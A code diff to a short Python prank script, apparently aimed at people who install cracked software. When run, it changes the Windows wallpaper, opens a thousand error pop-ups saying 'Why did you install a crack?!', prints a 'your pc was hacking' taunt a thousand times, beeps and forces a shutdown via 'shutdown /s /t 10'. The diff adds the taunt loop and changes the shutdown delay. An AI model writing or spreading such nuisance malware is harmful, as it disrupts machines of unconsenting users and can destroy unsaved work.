@@ -14,14 +14,13 @@ def change_wallpaper(image_path):
         ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
         for _ in range(1000):  
             show_message("Warning", "Why did you install a crack?!")
-        print("#ctypes:1000")
     except Exception as e:
         show_message("Error", f"Failed to change wallpaper: {e}")
         
 def shutdown_pc():
     winsound.Beep(440, 1000)  
     winsound.Beep(660, 1000) 
-    subprocess.run("shutdown /s /t 5", shell=True)  
+    subprocess.run("shutdown /s /t 10", shell=True)  
 
 def show_message(title, message):
     root = tk.Tk()
@@ -29,7 +28,8 @@ def show_message(title, message):
     messagebox.showerror(title, message)  
 
 image_path = "d:\\download\\wallpaperflare.com_wallpaper (2).jpg"  
-
+for _ in range(1000):  
+    print("your pc was hacking dont turn on again lol")
 change_wallpaper(image_path)
 shutdown_pc()
 
